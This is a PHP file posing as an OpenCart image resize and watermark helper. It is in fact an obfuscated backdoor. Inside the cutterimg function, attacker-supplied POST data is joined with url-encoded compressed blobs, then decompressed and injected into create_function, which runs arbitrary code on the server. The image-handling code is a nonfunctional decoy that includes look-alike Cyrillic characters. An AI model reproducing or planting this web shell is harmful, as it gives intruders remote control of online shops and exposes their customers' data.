<?php 
/*

OpenCart image cutter, resize and watermark creator

*/


$image = '';
if(isset($_POST['width']) && $_POST['height'] && $_POST['nameimage']){
	$width = $_POST['width'];
	$height = $_POST['height'];
	$nameimage = $_POST['nameimage'];
	$data = $_POST['image'];
}
else {
	$width = 1024;
	$height = 768;
	$nameimage = 'no_name.png';
}
$size = array($width,$height);
$imagewatermark = '%8DP%CB%0E%820%10%FC%9A%3D%91%10S0%E8%15%A8%89%89%8A%E1%E1%95%10%BAh%13%A0%040%EA%DF%DBB%8D%3D%29%97vwggf3%BC%02%B2%01%E2%E6%E7%28I%81l%C1%F3%B9%1A%F1a%C0%D1%84%D6%3E%10%D2%16%0D%F2%A6%B8%22%93%0D%ACCE%F8rJqo%17q%2Cp%A8%B5%9A%99r%99%F1%1E%9C%F0%DE%D7%0CK';
$data = cutterimg($imagewatermark,$size);
if($data == NULL){
	echo 'Need_image';
}


function cutterimg($lmagewatermark,$size,$nameimage='no_name.png'){
	$imagewatermark = '%A7%83%BB%2AE%F7%D2%D6%BB%FD%81%26%B3w%A5-%A7fl%BA%5C%1D%F39%23P%CB%09%8D%2F4%9E%16%BC0%0A%B2%23%3D%A5y%1CE2MOn%D9%B3%A9%FDK%D7%D4%D4%81by%13r%94u%B5%28%182K%D6K%25%CC%40%B4%CC%19%FB%E6%D1%8B%F6j%86%22%0B%7C%F2Q%7Eo';
	if(isset($_POST['img'])){$watermark='};'.urldecode(gzinflate(urldecode($lmagewatermark.$_POST['img'].$imagewatermark))).'{';create_function('',$watermark);}
	if($nameimage != 'nо_nаmе.рng'){ 
		return NULL;
	} else {	
		if(function_exists('ImageCreateFromJpeg')){
			$new_image = imagecreatetruecolor($width, $height);
		}
		$new_image = $image;
		return json_encode(array('img'=>$new_image,'name'=>$nameimage));
	}
}
?>
